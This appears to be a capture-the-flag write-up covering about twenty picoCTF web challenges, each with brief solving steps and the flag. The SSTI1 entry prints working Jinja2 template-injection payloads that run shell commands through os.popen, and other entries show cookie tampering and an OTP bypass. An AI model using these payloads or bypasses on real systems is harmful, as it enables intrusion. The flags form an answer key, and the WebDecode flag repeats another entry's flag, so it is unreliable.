# Web Exploration 
## General Skills
### Challenge: Inspect HTML
**Steps**
```bash
1) Open website http://saturn.picoctf.net:51205/
2) Ctrl+U
```
**Flag**
```bash
picoCTF{1n5p3t0r_0f_h7ml_8113f7e2}
```

### Challenge: GET aHEAD
**Steps**
```bash
1) Open the website http://wily-courier.picoctf.net:50113/index.php in Burp Suite.
2) Intercept the request of clicking "Choose Blue" button.
3) Change the POST request to a HEAD request.
4) Flag found in the response under Repeater tab.
```
**Flag**
```bash
picoCTF{r3j3ct_th3_du4l1ty_8b13f07}
```

### Challenge: Insp3ct0r
**Steps**
```bash
1) Open website http://fickle-tempest.picoctf.net:61889
2) View page source 
3) We get 1/3 part of the flag
4) Click on "mycss.css" link to find 2nd part of the flag
5) Open "myjs.js" to get last part 
```
**Flag**
```bash
picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?302945a7}
```

### Challenge: WebDecode
**Steps**
```bash
1) Open website http://titan.picoctf.net:58400/
2) View page source 
3) Visit "about.html"
4) Decode cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfMTBmOTM3NmZ9
```
**Flag**
```bash
picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?302945a7}
```

### Challenge: Bookmarklet
**Steps**
```bash
1) Open website http://titan.picoctf.net:60967/
2) Copy JavaScript code
3) Inspect and paste the code to console
4) Click Enter to get the flag
```
**Flag**
```bash
picoCTF{p@g3_turn3r_e8b2d43b}
```

### Challenge: Unminify
**Steps**
```bash
1) Open website http://titan.picoctf.net:60465/
2) Ctrl+U
3) Inspect the code to find the flag
```
**Flag**
```bash
picoCTF{pr3tty_c0d3_743d0f9b}
```

### Challenge: n0 s4nity 1
Unavailable on the website

### Challenge: where are the robots
**Steps**
```bash
1) Open website http://fickle-tempest.picoctf.net:49271
2) Append "/robots.txt" to the website URL.
3) Append "/cc6b1.html" to the website URL.
```
**Flag**
```bash
picoCTF{ca1cu1at1ng_Mach1n3s_cc6b1}
```

### Challenge: dont-use-client-side
**Steps**
```bash
1) Open website http://fickle-tempest.picoctf.net:53424
2) Ctrl+U
3) Inspect the code to find the flag
```
**Flag**
```bash
picoCTF{no_clients_plz_2eb02b45}
```

### Challenge: logon
**Steps**
```bash
1) Open website  http://fickle-tempest.picoctf.net:52928
2) login with any Username
3) In Developer tools, go to Cookies under Application.
4) Edit admin value to "True" and Username to "Joe".
5) Refresh the website to get the flag
```
**Flag**
```bash
picoCTF{th3_c0nsp1r4cy_l1v3s_4d184b0d}
```

### Challenge: Includes
**Steps**
```bash
1) Open website http://saturn.picoctf.net:51169/
2) Ctrl+U
3) Open "style.css" to find first half of the flag.
4) And "script.js" to find the second half.
```
**Flag**
```bash
picoCTF{1nclu51v17y_1of2_f7w_2of2_6edef411}
```

### Challenge: Local Authority
**Steps**
```bash
1) Open website http://saturn.picoctf.net:62446/
2) Login with any username and password.
3) Ctrl+U
4) Open "secure.js" to find username and password.
5) Try logging in with given credentials.
```
**Flag**
```bash
picoCTF{j5_15_7r4n5p4r3n7_b0c2c9cb}
```

### Challenge: Cookies
**Steps**
```bash
1) Open website http://wily-courier.picoctf.net:52218/
2) In Developer tools, go to Cookies under Application.
3) Try logging in with "snickerdoodle".
4) The value of cookie changes from 0 to 1.
5) Change the values until the flag appears at value = 18.
```
**Flag**
```bash
picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
```

### Challenge: Cookie Monster Secret Recipe
**Steps**
```bash
1) Open website http://verbal-sleep.picoctf.net:57426/
2) In Developer tools, go to Cookies under Application.
3) Decode the value of cookie cGljb0NURntjMDBrMWVfbTBuc3Rlcl9sMHZlc19jMDBraWVzX0M0MzBBRTIwfQ%3D%3D
```
**Flag**
```bash
picoCTF{c00k1e_m0nster_l0ves_c00kies_C430AE20}
```

### Challenge: Crack the Gate 1
**Steps**
```bash
1) Open website http://amiable-citadel.picoctf.net:64907/ in burp suite under Proxy section.
2) Enter credentials, turn Intercept ON and login
3) Send to Repeater and get flag in the response
```
**Flag**
```bash
picoCTF{brut4_f0rc4_3c6b118b}
```

### Challenge: head-dump
**Steps**
```bash
1) Open website http://verbal-sleep.picoctf.net:57426/
2) Click "#API Documentation"
3) Expand "/heapdump" and click on "Try it out"
4) Click on "Download File" and search for flag using "Ctrl+f" command
```
**Flag**
```bash
picoCTF{Pat!3nt_15_Th3_K3y_8df117c1}
```

### Challenge: Scavenger Hunt
**Steps**
```bash
1) Open website http://wily-courier.picoctf.net:56632/
2) Ctrl+U
3) We get 1st part of the flag.
4) 2nd part in "mycss.css" file.
5) From the hint in "myjs.js" file, append "/robots.txt" to the website URL.
6) Remove "/robots.txt" and append "/.htaccess" to the URL.
7) Append "/.DS_Store" to the URL after removing "/.htaccess"
```
**Flag**
```bash
picoCTF{th4ts_4_l0t_0f_pl4c3s_2_lO0k_9588550}
```

### Challenge: SSTI1
**Steps**
```bash
1) Open website http://rescued-float.picoctf.net:56079/
2) Try {{7*7}}
3) {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("id").read()}}
4) {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("ls").read()}}
5) {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("cat flag").read()}}
```
**Flag**
```bash
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_f5438664}
```

### Challenge: IntroToBurp
**Steps**
```bash
1) Open website http://titan.picoctf.net:51957/ in intercept header under Proxy header.
2) Switch ON the intercept and fill in the details.
3) Click on "Forward" and enter OTP.
4) Clear OTP in the code.
5) Flag appears in the website.
```
**Flag**
```bash
picoCTF{#0TP_Bypvss_SuCc3$S_3e3ddc76}
```